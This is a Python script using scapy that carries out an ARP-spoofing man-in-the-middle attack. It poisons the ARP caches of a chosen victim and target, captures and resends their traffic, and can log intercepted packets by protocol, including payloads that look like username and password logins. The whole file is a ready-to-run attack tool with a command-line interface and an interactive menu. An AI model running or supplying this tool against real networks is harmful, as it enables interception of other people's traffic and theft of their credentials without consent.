#!/usr/bin/env python3
# Man-in-the-middle with ARP Spoofing

import argparse
from scapy.all import *
from scapy.all import ARP
from scapy.all import IP
from scapy.all import fragment
import time
import threading
import sys
import signal

# Global flag to handle graceful termination
running = True

def arpSpoof(targetIp, spoofIp, iface):
    pkt = ARP(op=2, pdst=targetIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoofIp)
    print(f"Sending ARP spoof packets to target {targetIp}, impersonating {spoofIp}.")
    while running:
        send(pkt, iface=iface, verbose=False)
        time.sleep(1)

def forwardPacket(pkt, victimIp, targetIp, iface):
     if pkt.haslayer(IP):
        sendp(pkt, iface=iface, verbose=False)

def sniffAndForward(victimIp, targetIp, iface):
    print(f"Starting packet sniffing on {iface}")
    sniff(iface=iface, filter="ip", prn=lambda x: forwardPacket(x, victimIp, targetIp, iface), store=0, timeout=None)

def startAttack(victimIp, targetIp, iface, report):
    # Start ARP poisoning threads
    threading.Thread(target=arpSpoof, args=(victimIp, targetIp, iface), daemon=True).start()
    threading.Thread(target=arpSpoof, args=(targetIp, victimIp, iface), daemon=True).start()
    # Start sniffing and forwarding packets
    if report == 1:
        createReport(victimIp, targetIp, iface)
    else:
        sniffAndForward(victimIp, targetIp, iface)

def createReport(victimIp, targetIp, iface):
    applicationPorts = {
    21: "FTP", 22: "SSH", 23: "Telnet",
    25: "SMTP", 53: "DNS", 67: "DHCP", 68: "DHCP",
    80: "HTTP", 443: "HTTPS", 110: "POP3",
    143: "IMAP", 389: "LDAP", 161: "SNMP",
    3306: "MySQL", 5432: "PostgreSQL"
    }

    def getApplicationProtocol(packet):
        protocols = []
        if packet.haslayer("TCP") or packet.haslayer("UDP"):
            sport = packet.sport
            dport = packet.dport
            if sport in applicationPorts:
                protocols.append(applicationPorts[sport])
            if dport in applicationPorts:
                protocols.append(applicationPorts[dport])
 
        if packet.haslayer("Raw"):
            payload = packet["Raw"].load.decode(errors="ignore").lower()
            if any(method in payload for method in ["get ", "post ", "put ", "delete ", "host: "]):
                protocols.append("HTTP")
            if "tls" in payload or "ssl" in payload:
                protocols.append("TLS/SSL")
            if "220" in payload and "ftp" in payload:
                protocols.append("FTP")
            if "ehlo" in payload or "mail from" in payload:
                protocols.append("SMTP")
            if "user" in payload and "pass" in payload:
                protocols.append("Telnet/FTP Login")
            if "bind" in payload or "query" in payload:
                protocols.append("DNS Query")
            if "mysql_native_password" in payload or "handshake" in payload:
                protocols.append("MySQL")
            if "postgresql" in payload or "scram-sha-256" in payload:
                protocols.append("PostgreSQL")
            if "ldap" in payload or "bindrequest" in payload:
                protocols.append("LDAP")
            if "snmp" in payload or "community" in payload:
                protocols.append("SNMP")
            if "dhcp" in payload or "discover" in payload:
                protocols.append("DHCP")
 
        return protocols
     
    def packetCallback(packet):
        if victimIp:
            if packet.haslayer(IP) and not (packet[IP].src == victimIp or packet[IP].dst == victimIp):
                return  # Skip packets that don't involve the target IP

        protocols = getApplicationProtocol(packet)
        if protocols:
            print(f"Application Layer Protocols: {protocols} | Packet Summary: {packet.summary()}")

    try:
        print(f"\nSniffing packets involving {victimIp}... Press Ctrl+C to stop and create a report.")
        time.sleep(1)
        sniff(iface=iface, filter="ip", prn=lambda pkt: packetCallback(pkt), store=False, timeout=None)
    except KeyboardInterrupt:
        print("\nStopping packet sniffing.")

def menu():
    RED = "\033[38;2;255;0;0m"
    RESET = "\033[0m"
    victimIp = input(f"{RED}\nHost IP: {RESET}")
    targetIp = input(f"{RED}Target IP: {RESET}")
    interface = input(f"{RED}Interface: {RESET}")
    while True:
        report = input("Want to create a report during the attack? [Y]es | [N]o: ")
        if report.lower() == "y":
            startAttack(victimIp, targetIp, interface, 1)
        elif report.lower() == "n":
            startAttack(victimIp, targetIp, interface, 0)
            break
        else:
            print("Invalid.")
            
def terminal():
    parser = argparse.ArgumentParser(description="ARP Spoofing", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-v", "--victimip", required=True, help="Victim IP address.")
    parser.add_argument("-t", "--targetip", required=True, help="Target IP address.")
    parser.add_argument("-i", "--interface", required=True, help="Interface to use for the attack.")
    parser.add_argument("-r", "--report", action="store_true", help="Create a report.")

    args = parser.parse_args()

    if args.victimip and args.targetip and args.interface:
        if args.report:
            startAttack(args.victimip, args.targetip, args.interface, 1)
        else:
            startAttack(args.victimip, args.targetip, args.interface, 0)
    else:
        parser.error("Syntax error.")

def signalHandler(sig, frame):
    global running
    print("\nGracefully stopping attack...")
    running = False
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signalHandler)  
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()